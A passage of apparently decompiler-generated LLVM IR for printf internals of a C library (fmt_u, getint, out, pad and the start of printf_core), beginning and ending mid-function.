  uselistorder i32 %v1_1412c, { 1, 0 }
  uselistorder i32 %v0_1411c, { 1, 0 }
}

define i32 @fmt_u(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14224 = load i32, i32* @r4, align 4
  store i32 %v3_14224, i32* %stack_var_-16, align 4
  %v6_14224 = load i32, i32* @r5, align 4
  %v9_14224 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  %v2_1426015 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  br i1 %v2_1426015, label %dec_label_pc_14278, label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %entry, %dec_label_pc_14238
  %v0_1426817 = phi i32 [ %v0_14248, %dec_label_pc_14238 ], [ %arg2, %entry ]
  %v0_142a0316 = phi i32 [ %v4_14254, %dec_label_pc_14238 ], [ %arg1, %entry ]
  %v4_14238 = call i32 @__aeabi_uldivmod(i32 %v0_142a0316, i32 %v0_1426817, i32 10, i32 0)
  %v2_14240 = load i32, i32* @r6, align 4
  %v3_14240 = add i32 %v2_14240, -1
  %v4_14240 = inttoptr i32 %v3_14240 to i8*
  store i8 58, i8* %v4_14240, align 1
  %v5_14240 = load i32, i32* @r6, align 4
  %v6_14240 = add i32 %v5_14240, -1
  store i32 %v6_14240, i32* @r6, align 4
  %v0_14244 = load i32, i32* @r4, align 4
  store i32 %v0_14244, i32* @r0, align 4
  %v0_14248 = load i32, i32* @r5, align 4
  store i32 %v0_14248, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_14254 = call i32 @__aeabi_uldivmod(i32 %v0_14244, i32 %v0_14248, i32 10, i32 0)
  store i32 %v4_14254, i32* @r4, align 4
  store i32 %v0_14248, i32* @r5, align 4
  %v2_14260 = icmp eq i32 %v0_14248, 0
  store i32 %v4_14254, i32* @r0, align 4
  store i32 %v0_14248, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  br i1 %v2_14260, label %dec_label_pc_14260.dec_label_pc_14278_crit_edge, label %dec_label_pc_14238

dec_label_pc_14260.dec_label_pc_14278_crit_edge:  ; preds = %dec_label_pc_14238
  %v0_14278.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14278

dec_label_pc_14278:                               ; preds = %dec_label_pc_14260.dec_label_pc_14278_crit_edge, %entry
  %v0_14278 = phi i32 [ %v0_14278.pre, %dec_label_pc_14260.dec_label_pc_14278_crit_edge ], [ %arg3, %entry ]
  %v0_142a03.lcssa = phi i32 [ %v4_14254, %dec_label_pc_14260.dec_label_pc_14278_crit_edge ], [ %arg1, %entry ]
  store i32 %v0_14278, i32* %r5.global-to-local, align 4
  %v2_1429c2 = icmp eq i32 %v0_142a03.lcssa, 0
  br i1 %v2_1429c2, label %dec_label_pc_142ac, label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14278, %dec_label_pc_14280
  %v2_14288 = phi i32 [ %v6_14288, %dec_label_pc_14280 ], [ %v0_14278, %dec_label_pc_14278 ]
  %v0_14280 = phi i32 [ %v2_14294, %dec_label_pc_14280 ], [ %v0_142a03.lcssa, %dec_label_pc_14278 ]
  %v3_14280 = urem i32 %v0_14280, 10
  %v1_14284 = or i32 %v3_14280, 48
  %v1_14288 = trunc i32 %v1_14284 to i8
  %v3_14288 = add i32 %v2_14288, -1
  %v4_14288 = inttoptr i32 %v3_14288 to i8*
  store i8 %v1_14288, i8* %v4_14288, align 1
  %v5_14288 = load i32, i32* %r5.global-to-local, align 4
  %v6_14288 = add i32 %v5_14288, -1
  store i32 %v6_14288, i32* %r5.global-to-local, align 4
  %v0_1428c = load i32, i32* @r4, align 4
  %v2_14294 = udiv i32 %v0_1428c, 10
  store i32 %v2_14294, i32* @r4, align 4
  %tmp13 = icmp ult i32 %v0_1428c, 10
  br i1 %tmp13, label %dec_label_pc_142ac, label %dec_label_pc_14280

dec_label_pc_142ac:                               ; preds = %dec_label_pc_14280, %dec_label_pc_14278
  %v0_142ac = phi i32 [ %v0_14278, %dec_label_pc_14278 ], [ %v6_14288, %dec_label_pc_14280 ]
  %v2_142b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_142b0, i32* @r4, align 4
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v0_142ac

; uselistorder directives
  uselistorder i32 %v2_14294, { 1, 0 }
  uselistorder i32 %v6_14288, { 0, 2, 1 }
  uselistorder i32 %v0_14278, { 2, 0, 1 }
  uselistorder i32 %v4_14254, { 1, 2, 3, 0 }
  uselistorder i32 %v0_14248, { 2, 1, 4, 3, 5, 0 }
  uselistorder i8 58, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14280, { 1, 0 }
  uselistorder label %dec_label_pc_14238, { 1, 0 }
}

define i32 @getint(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 10, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142d0

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142d0
  %v1_142e0 = add i32 %v2_142d0, 1
  %v0_142c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_142c8 = load i32, i32* %r0.global-to-local, align 4
  %v3_142c8 = mul i32 %v1_142c8, %v0_142c8
  %v4_142c8 = add i32 %v3_142c8, %v1_142d8
  store i32 %v4_142c8, i32* %r0.global-to-local, align 4
  store i32 %v1_142e0, i32* %v1_142d0, align 4
  %v0_142d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_142d0

dec_label_pc_142d0:                               ; preds = %entry, %dec_label_pc_142c8
  %v1_142cc = phi i32 [ %tmp, %entry ], [ %v0_142d0.pre, %dec_label_pc_142c8 ]
  %v1_142d0 = inttoptr i32 %v1_142cc to i32*
  %v2_142d0 = load i32, i32* %v1_142d0, align 4
  %v1_142d4 = inttoptr i32 %v2_142d0 to i8*
  %v2_142d4 = load i8, i8* %v1_142d4, align 1
  %v3_142d4 = zext i8 %v2_142d4 to i32
  %v1_142d8 = add nsw i32 %v3_142d4, -48
  %tmp2 = icmp ult i32 %v1_142d8, 10
  br i1 %tmp2, label %dec_label_pc_142c8, label %dec_label_pc_142e8

dec_label_pc_142e8:                               ; preds = %dec_label_pc_142d0
  %v1_142e8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_142e8

; uselistorder directives
  uselistorder i32 %v2_142d0, { 1, 0 }
  uselistorder i32* %v1_142d0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_142d0, { 1, 0 }
}

define i32 @out(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_142ec = load i32, i32* @lr, align 4
  store i32 %v0_142ec, i32* %stack_var_-4, align 4
  %v2_142f0 = load i32, i32* %arg1, align 4
  store i32 %v2_142f0, i32* @r3, align 4
  %v1_142f4 = and i32 %v2_142f0, 32
  %v2_142f4 = icmp eq i32 %v1_142f4, 0
  %v0_14300 = load i32, i32* @r1, align 4
  br i1 %v2_142f4, label %bb, label %bb4

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  call void @__pseudo_cond_branch(i1 %v2_142f4, i32 ptrtoint (i32* @global_var_ee8c.681 to i32))
  %v2_14314 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_14314, i32* @lr, align 4
  ret i32 %v0_14300

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @pad(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-272 = alloca i32, align 4
  %v3_1431c = load i32, i32* @r4, align 4
  %v6_1431c = load i32, i32* @r5, align 4
  %v9_1431c = load i32, i32* @r6, align 4
  %v2_14320 = ptrtoint i32* %stack_var_-272 to i32
  %v1_14328 = and i32 %arg4, 73728
  %v2_14328 = icmp ne i32 %v1_14328, 0
  %. = zext i1 %v2_14328 to i32
  %v5_14338 = icmp sgt i32 %arg2, %arg3
  br i1 %v5_14338, label %thread-pre-split, label %bb13

bb13:                                             ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb13
  %v0_1433c = phi i32 [ 1, %bb13 ], [ %., %entry ]
  %v2_1433c = icmp eq i32 %v0_1433c, 0
  %v0_14340 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14340, i32* @r6, align 4
  br i1 %v2_1433c, label %dec_label_pc_14348, label %dec_label_pc_1438c

dec_label_pc_14348:                               ; preds = %thread-pre-split
  %v2_14348 = sub i32 %arg2, %arg3
  store i32 %v2_14348, i32* @r5, align 4
  %v2_1434c = icmp ult i32 %v2_14348, 256
  %.v2_14348 = select i1 %v2_1434c, i32 %v2_14348, i32 256
  store i32 %.v2_14348, i32* @r2, align 4
  store i32 %v2_14320, i32* @r0, align 4
  store i32 %v2_14320, i32* @r4, align 4
  %v0_14360 = call i32 @memset()
  store i32 %v0_14360, i32* %r0.global-to-local, align 4
  %v0_14370.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14370

dec_label_pc_14368:                               ; preds = %dec_label_pc_14370
  %v1_14368 = inttoptr i32 %v0_14374 to i32*
  %v2_14368 = call i32 @out(i32* %v1_14368)
  store i32 %v2_14368, i32* %r0.global-to-local, align 4
  %v0_1436c = load i32, i32* @r5, align 4
  %v1_1436c = add i32 %v0_1436c, -256
  store i32 %v1_1436c, i32* @r5, align 4
  br label %dec_label_pc_14370

dec_label_pc_14370:                               ; preds = %dec_label_pc_14348, %dec_label_pc_14368
  %v0_14384 = phi i32 [ %v0_14370.pre, %dec_label_pc_14348 ], [ %v1_1436c, %dec_label_pc_14368 ]
  %v0_14374 = load i32, i32* @r6, align 4
  store i32 %v0_14374, i32* %r0.global-to-local, align 4
  store i32 256, i32* @r2, align 4
  store i32 %v2_14320, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_14384, 255
  br i1 %tmp, label %dec_label_pc_14368, label %dec_label_pc_14384

dec_label_pc_14384:                               ; preds = %dec_label_pc_14370
  store i32 %v0_14384, i32* @r2, align 4
  %v1_14388 = inttoptr i32 %v0_14374 to i32*
  %v2_14388 = call i32 @out(i32* %v1_14388)
  store i32 %v2_14388, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1438c

dec_label_pc_1438c:                               ; preds = %thread-pre-split, %dec_label_pc_14384
  %v1_14394 = phi i32 [ %v0_14340, %thread-pre-split ], [ %v2_14388, %dec_label_pc_14384 ]
  store i32 %v3_1431c, i32* @r4, align 4
  store i32 %v6_1431c, i32* @r5, align 4
  store i32 %v9_1431c, i32* @r6, align 4
  ret i32 %v1_14394

; uselistorder directives
  uselistorder i32 %v0_14374, { 0, 2, 1 }
  uselistorder i32 %v0_14384, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 -256, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1438c, { 1, 0 }
  uselistorder label %dec_label_pc_14370, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @printf_core() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp489 = call i32 @__decompiler_undefined_function_0()
  %tmp495 = call i16 @__decompiler_undefined_function_2()
  %tmp496 = call i16* @__decompiler_undefined_function_5()
  %tmp498 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-98 = alloca i32, align 4
  %stack_var_-97 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-652 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-52 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-107 = alloca i32, align 4
  %stack_var_-146 = alloca i32, align 4
  %stack_var_-105 = alloca i32, align 4
  %stack_var_-64 = alloca i8, align 1
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-106 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_14398 = load i32, i32* @r4, align 4
  %v6_14398 = load i32, i32* @r5, align 4
  %v9_14398 = load i32, i32* @r6, align 4
  %v12_14398 = load i32, i32* @r7, align 4
  %v15_14398 = load i32, i32* @r8, align 4
  %v18_14398 = load i32, i32* @sb, align 4
  %v21_14398 = load i32, i32* @sl, align 4
  %v27_14398 = load i32, i32* @lr, align 4
  %v2_143a0 = ptrtoint i32* %stack_var_-108 to i32
  %v2_143a4 = ptrtoint i32* %stack_var_-84 to i32
  %v2_143a8 = ptrtoint i32* %stack_var_-106 to i32
  store i32 %v2_143a8, i32* %ip.global-to-local, align 4
  %v2_143ac = ptrtoint i8* %stack_var_-72 to i32
  %v0_143b0 = load i32, i32* @r1, align 4
  %v5_143b0 = inttoptr i32 %v0_143b0 to i8*
  store i8* %v5_143b0, i8** %stack_var_-44, align 4
  store i32 0, i32* @r5, align 4
  %v2_143c4 = sub i32 %v2_143ac, %v2_143a8
  store i32 %v2_143c4, i32* %r1.global-to-local, align 4
  %v6_143cc = trunc i32 %v2_143ac to i8
  %v0_143d0 = load i32, i32* @r0, align 4
  %v0_143d4 = load i32, i32* @r2, align 4
  %v0_143d8 = load i32, i32* @r3, align 4
  %v2_14480 = icmp eq i32 %v0_143d0, 0
  %v1_145a0 = inttoptr i32 %v0_143d4 to i32*
  %v8_146ac = ptrtoint i8** %stack_var_-44 to i32
  %v1_146b0 = bitcast i8** %stack_var_-44 to i32*
  %v1_15bf0 = inttoptr i32 %v0_143d0 to i32*
  %v2_14cc0 = ptrtoint i8* %stack_var_-64 to i32
  %v2_14de0 = ptrtoint i8* %stack_var_-52 to i32
  %v2_15040 = ptrtoint i32* %stack_var_-70 to i32
  %v5_15184 = ptrtoint i32* %stack_var_-652 to i32
  %v2_158f4 = ptrtoint i32* %stack_var_-97 to i32
  %v2_158fc = ptrtoint i32* %stack_var_-98 to i32
  %v5_15188 = ptrtoint i32* %stack_var_-364 to i32
  %v2_14c24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_14b20 = ptrtoint i32* %stack_var_-146 to i32
  %v3_14b44 = ptrtoint i32* %stack_var_-105 to i32
  %v2_14b74 = ptrtoint i32* %stack_var_-107 to i32
  %v4_1490c = ptrtoint i16* %tmp496 to i32
  %v4_14910 = sext i16 %tmp495 to i32
  %v2_14914 = bitcast i16* %tmp496 to i32*
  %v3_1492c = add i32 %v4_1490c, 4
  %v4_1492c = inttoptr i32 %v3_1492c to i32*
  %v1_14904 = trunc i16 %tmp495 to i8
  %v3_14904 = bitcast i16* %tmp496 to i8*
  %v1_14494 = xor i1 %v2_14480, true
  %v2_14f2c = add i32 %v2_143a4, 11
  %storemerge19 = ashr i32 %v4_14910, 31
  br label %dec_label_pc_143e4

dec_label_pc_143e4:                               ; preds = %bb640, %dec_label_pc_15b68, %bb584, %dec_label_pc_15114, %.thread34, %dec_label_pc_148a0, %dec_label_pc_1475c, %dec_label_pc_1490c, %dec_label_pc_148fc, %dec_label_pc_148ec, %dec_label_pc_14928, %dec_label_pc_148cc, %bb644, %entry
  %stack_var_-692.0 = phi i32 [ %tmp489, %entry ], [ %stack_var_-692.0, %dec_label_pc_1475c ], [ %stack_var_-692.0, %bb644 ], [ %stack_var_-692.0, %dec_label_pc_148a0 ], [ %stack_var_-692.0, %dec_label_pc_14928 ], [ %stack_var_-692.0, %dec_label_pc_148fc ], [ %stack_var_-692.0, %dec_label_pc_148ec ], [ %stack_var_-692.0, %dec_label_pc_148cc ], [ %stack_var_-692.0, %dec_label_pc_1490c ], [ %stack_var_-692.2, %bb584 ], [ %stack_var_-692.2, %dec_label_pc_15114 ], [ %stack_var_-692.3, %bb640 ], [ %stack_var_-692.3, %dec_label_pc_15b68 ], [ %stack_var_-692.0, %.thread34 ]
  %stack_var_-60.0 = phi i32 [ %tmp498, %entry ], [ %stack_var_-60.1, %dec_label_pc_1475c ], [ %stack_var_-60.5, %bb644 ], [ %v0_14cdc, %dec_label_pc_148a0 ], [ %v0_14cdc, %dec_label_pc_14928 ], [ %v0_14cdc, %dec_label_pc_148fc ], [ %v0_14cdc, %dec_label_pc_148ec ], [ %v0_14cdc, %dec_label_pc_148cc ], [ %v0_14cdc, %dec_label_pc_1490c ], [ %v0_14cdc, %bb584 ], [ %v0_14cdc, %dec_label_pc_15114 ], [ %v0_14cdc, %bb640 ], [ %v0_14cdc, %dec_label_pc_15b68 ], [ %stack_var_-60.0, %.thread34 ]
  %stack_var_-716.0 = phi i32 [ 0, %entry ], [ %stack_var_-716.3, %dec_label_pc_1475c ], [ %stack_var_-716.3, %bb644 ], [ %stack_var_-716.3, %dec_label_pc_148a0 ], [ %stack_var_-716.3, %dec_label_pc_14928 ], [ %stack_var_-716.3, %dec_label_pc_148fc ], [ %stack_var_-716.3, %dec_label_pc_148ec ], [ %stack_var_-716.3, %dec_label_pc_148cc ], [ %stack_var_-716.3, %dec_label_pc_1490c ], [ %stack_var_-716.3, %bb584 ], [ %stack_var_-716.3, %dec_label_pc_15114 ], [ %stack_var_-716.3, %bb640 ], [ %stack_var_-716.3, %dec_label_pc_15b68 ], [ %stack_var_-716.0, %.thread34 ]
  %v0_143f4 = phi i32 [ 0, %entry ], [ %stack_var_-704.2, %dec_label_pc_1475c ], [ %stack_var_-704.2, %bb644 ], [ %stack_var_-704.2, %dec_label_pc_148a0 ], [ %stack_var_-704.2, %dec_label_pc_14928 ], [ %stack_var_-704.2, %dec_label_pc_148fc ], [ %stack_var_-704.2, %dec_label_pc_148ec ], [ %stack_var_-704.2, %dec_label_pc_148cc ], [ %stack_var_-704.2, %dec_label_pc_1490c ], [ %stack_var_-704.2, %bb584 ], [ %stack_var_-704.2, %dec_label_pc_15114 ], [ %stack_var_-704.2, %bb640 ], [ %stack_var_-704.2, %dec_label_pc_15b68 ], [ %stack_var_-704.2, %.thread34 ]
  store i32 %v0_143f4, i32* %r2.global-to-local, align 4
  %v1_143e8 = icmp slt i32 %v0_143f4, 0
  br i1 %v1_143e8, label %dec_label_pc_14420, label %dec_label_pc_143f0

dec_label_pc_143f0:                               ; preds = %dec_label_pc_143e4
  %v2_143f4 = sub i32 2147483647, %v0_143f4
  store i32 %v2_143f4, i32* %r3.global-to-local, align 4
  %v0_143f8 = load i32, i32* @r5, align 4
  %v2_143f8 = sub i32 %v0_143f8, %v2_143f4
  %v4_143f8 = xor i32 %v0_143f8, %v2_143f4
  %v5_143f8 = xor i32 %v2_143f8, %v0_143f8
  %v6_143f8 = and i32 %v5_143f8, %v4_143f8
  %v7_143f8 = icmp slt i32 %v6_143f8, 0
  %v8_143f8 = icmp slt i32 %v2_143f8, 0
  %v9_143f8 = icmp eq i32 %v0_143f8, %v2_143f4
  %v3_143fc = xor i1 %v8_143f8, %v7_143f8
  %v4_143fc = or i1 %v9_143f8, %v3_143fc
  br i1 %v4_143fc, label %.thread427, label %dec_label_pc_1440c

.thread427:                                       ; preds = %dec_label_pc_143f0
  %v7_14400 = add i32 %v0_143f8, %v0_143f4
  store i32 %v7_14400, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14420

dec_label_pc_1440c:                               ; preds = %dec_label_pc_143f0
  %v0_1440c = call i32 @__errno_location()
  store i32 %v0_1440c, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_1441c = inttoptr i32 %v0_1440c to i32*
  store i32 75, i32* %v2_1441c, align 4
  br label %dec_label_pc_14420

dec_label_pc_14420:                               ; preds = %.thread427, %dec_label_pc_143e4, %dec_label_pc_1440c
  %stack_var_-704.2 = phi i32 [ %v0_143f4, %dec_label_pc_143e4 ], [ -1, %dec_label_pc_1440c ], [ %v7_14400, %.thread427 ]
  %v3_14420 = load i8*, i8** %stack_var_-44, align 4
  %v4_14420 = ptrtoint i8* %v3_14420 to i32
  store i32 %v4_14420, i32* @r8, align 4
  %v2_14424 = load i8, i8* %v3_14420, align 1
  %v3_14424 = zext i8 %v2_14424 to i32
  store i32 %v3_14424, i32* %r3.global-to-local, align 4
  %v2_14428 = icmp eq i8 %v2_14424, 0
  br i1 %v2_14428, label %dec_label_pc_15c64, label %dec_label_pc_14438.preheader

dec_label_pc_14438.preheader:                     ; preds = %dec_label_pc_14420
  store i32 %v4_14420, i32* %r2.global-to-local, align 4
  %v2_1443c155 = load i8, i8* %v3_14420, align 1
  %v3_1443c156 = zext i8 %v2_1443c155 to i32
  store i32 %v3_1443c156, i32* %r3.global-to-local, align 4
  %v2_14440157 = icmp eq i8 %v2_1443c155, 0
  br i1 %v2_14440157, label %.thread, label %.lr.ph

dec_label_pc_14434:                               ; preds = %.lr.ph
  %v5_14434 = inttoptr i32 %v1_14448 to i8*
  store i8* %v5_14434, i8** %stack_var_-44, align 4
  store i32 %v1_14448, i32* %r2.global-to-local, align 4
  %v2_1443c = load i8, i8* %v5_14434, align 1
  %v3_1443c = zext i8 %v2_1443c to i32
  store i32 %v3_1443c, i32* %r3.global-to-local, align 4
  %v2_14440 = icmp eq i8 %v2_1443c, 0
  br i1 %v2_14440, label %.thread, label %.lr.ph

.thread:                                          ; preds = %dec_label_pc_14434, %dec_label_pc_14438.preheader
  %v3_1445c238 = phi i8* [ %v3_14420, %dec_label_pc_14438.preheader ], [ %v5_14434, %dec_label_pc_14434 ]
  %v0_1444831 = phi i32 [ %v4_14420, %dec_label_pc_14438.preheader ], [ %v1_14448, %dec_label_pc_14434 ]
  %v1_1444832 = add i32 %v0_1444831, 1
  store i32 %v1_1444832, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1445c.preheader

.lr.ph:                                           ; preds = %dec_label_pc_14438.preheader, %dec_label_pc_14434
  %v3_1445c237 = phi i8* [ %v5_14434, %dec_label_pc_14434 ], [ %v3_14420, %dec_label_pc_14438.preheader ]
  %v0_14448 = phi i32 [ %v1_14448, %dec_label_pc_14434 ], [ %v4_14420, %dec_label_pc_14438.preheader ]
  %v1_14444 = phi i32 [ %v3_1443c, %dec_label_pc_14434 ], [ %v3_1443c156, %dec_label_pc_14438.preheader ]
  %v8_14444 = icmp eq i32 %v1_14444, 37
  %v1_14448 = add i32 %v0_14448, 1
  store i32 %v1_14448, i32* %r1.global-to-local, align 4
  br i1 %v8_14444, label %dec_label_pc_1445c.preheader, label %dec_label_pc_14434

dec_label_pc_1445c.preheader:                     ; preds = %.lr.ph, %.thread
  %v0_14458.ph = phi i32 [ %v0_1444831, %.thread ], [ %v0_14448, %.lr.ph ]
  %v3_1445c.ph = phi i8* [ %v3_1445c238, %.thread ], [ %v3_1445c237, %.lr.ph ]
  %v4_1445c680 = ptrtoint i8* %v3_1445c.ph to i32
  store i32 %v4_1445c680, i32* %r1.global-to-local, align 4
  %v2_14460681 = load i8, i8* %v3_1445c.ph, align 1
  %v3_14460682 = zext i8 %v2_14460681 to i32
  store i32 %v3_14460682, i32* %r3.global-to-local, align 4
  %v7_14464685 = icmp eq i8 %v2_14460681, 37
  %v1_14468686 = add i32 %v4_1445c680, 2
  store i32 %v1_14468686, i32* %r0.global-to-local, align 4
  br i1 %v7_14464685, label %dec_label_pc_14470, label %dec_label_pc_1447c

dec_label_pc_14454:                               ; preds = %dec_label_pc_14470
  %v5_14454 = inttoptr i32 %v1_14468689 to i8*
  store i8* %v5_14454, i8** %stack_var_-44, align 4
  %v1_14458 = add i32 %v0_14458687, 1
  store i32 %v1_14458, i32* %r2.global-to-local, align 4
  store i32 %v1_14468689, i32* %r1.global-to-local, align 4
  %v2_14460 = load i8, i8* %v5_14454, align 1
  %v3_14460 = zext i8 %v2_14460 to i32
  store i32 %v3_14460, i32* %r3.global-to-local, align 4
  %v7_14464 = icmp eq i8 %v2_14460, 37
  %v1_14468 = add i32 %v1_14468689, 2
  store i32 %v1_14468, i32* %r0.global-to-local, align 4
  br i1 %v7_14464, label %dec_label_pc_14470, label %dec_label_pc_1447c

dec_label_pc_14470:                               ; preds = %dec_label_pc_1445c.preheader, %dec_label_pc_14454
  %v4_1445c688 = phi i32 [ %v1_14468689, %dec_label_pc_14454 ], [ %v4_1445c680, %dec_label_pc_1445c.preheader ]
  %v1_14468689 = phi i32 [ %v1_14468, %dec_label_pc_14454 ], [ %v1_14468686, %dec_label_pc_1445c.preheader ]
  %v0_14458687 = phi i32 [ %v1_14458, %dec_label_pc_14454 ], [ %v0_14458.ph, %dec_label_pc_1445c.preheader ]
  %v1_14470 = add i32 %v4_1445c688, 1
  %v2_14470 = inttoptr i32 %v1_14470 to i8*
  %v3_14470 = load i8, i8* %v2_14470, align 1
  %v4_14470 = zext i8 %v3_14470 to i32
  store i32 %v4_14470, i32* %r3.global-to-local, align 4
  %v7_14474 = icmp eq i8 %v3_14470, 37
  br i1 %v7_14474, label %dec_label_pc_14454, label %dec_label_pc_1447c

dec_label_pc_1447c:                               ; preds = %dec_label_pc_14470, %dec_label_pc_14454, %dec_label_pc_1445c.preheader
  %v0_14458.lcssa = phi i32 [ %v0_14458.ph, %dec_label_pc_1445c.preheader ], [ %v1_14458, %dec_label_pc_14454 ], [ %v0_14458687, %dec_label_pc_14470 ]
  store i32 %v0_143d0, i32* %lr.global-to-local, align 4
  %v2_14484 = sub i32 %v0_14458.lcssa, %v4_14420
  store i32 %v2_14484, i32* @r5, align 4
  br i1 %v2_14480, label %.thread34, label %bb

bb:                                               ; preds = %dec_label_pc_1447c
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 %v4_14420, i32* %r1.global-to-local, align 4
  store i32 %v2_14484, i32* %r2.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %dec_label_pc_1447c, %bb
  call void @__pseudo_cond_branch(i1 %v1_14494, i32 ptrtoint (i32* @global_var_142ec.682 to i32))
  %v0_14498 = load i32, i32* @r5, align 4
  %v2_14498 = icmp eq i32 %v0_14498, 0
  br i1 %v2_14498, label %dec_label_pc_144a0, label %dec_label_pc_143e4

dec_label_pc_144a0:                               ; preds = %.thread34
  %v3_144a0 = load i8*, i8** %stack_var_-44, align 4
  %v4_144a0 = ptrtoint i8* %v3_144a0 to i32
  store i32 %v4_144a0, i32* %r2.global-to-local, align 4
  %v1_144a4 = add i32 %v4_144a0, 1
  %v2_144a4 = inttoptr i32 %v1_144a4 to i8*
  %v3_144a4 = load i8, i8* %v2_144a4, align 1
  %v4_144a4 = zext i8 %v3_144a4 to i32
  store i32 %v4_144a4, i32* %r3.global-to-local, align 4
  %v1_144a8 = add nsw i32 %v4_144a4, -48
  store i32 %v1_144a8, i32* %r0.global-to-local, align 4
  store i32 %v1_144a4, i32* %r1.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_144a8, 9
  br i1 %tmp, label %dec_label_pc_144dc, label %dec_label_pc_144b8

dec_label_pc_144b8:                               ; preds = %dec_label_pc_144a0
  %v1_144b8 = add i32 %v4_144a0, 2
  %v2_144b8 = inttoptr i32 %v1_144b8 to i8*
  %v3_144b8 = load i8, i8* %v2_144b8, align 1
  %v4_144b8 = zext i8 %v3_144b8 to i32
  store i32 %v4_144b8, i32* %r3.global-to-local, align 4
  %v7_144bc = icmp eq i8 %v3_144b8, 36
  br i1 %v7_144bc, label %dec_label_pc_144c4, label %dec_label_pc_144dc

dec_label_pc_144c4:                               ; preds = %dec_label_pc_144b8
  %v1_144c4 = add i32 %v4_144a0, 3
  store i32 %v1_144c4, i32* %r3.global-to-local, align 4
  store i32 %v1_144a8, i32* @r7, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v5_144d4 = inttoptr i32 %v1_144c4 to i8*
  store i8* %v5_144d4, i8** %stack_var_-44, align 4
  br label %dec_label_pc_144e4

dec_label_pc_144dc:                               ; preds = %dec_label_pc_144b8, %dec_label_pc_144a0
  store i8* %v2_144a4, i8** %stack_var_-44, align 4
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_144e4

dec_label_pc_144e4:                               ; preds = %dec_label_pc_144c4, %dec_label_pc_144dc
  %v3_14508242 = phi i8* [ %v2_144a4, %dec_label_pc_144dc ], [ %v5_144d4, %dec_label_pc_144c4 ]
  %stack_var_-716.1 = phi i32 [ %stack_var_-716.0, %dec_label_pc_144dc ], [ 1, %dec_label_pc_144c4 ]
  store i32 75913, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_14508

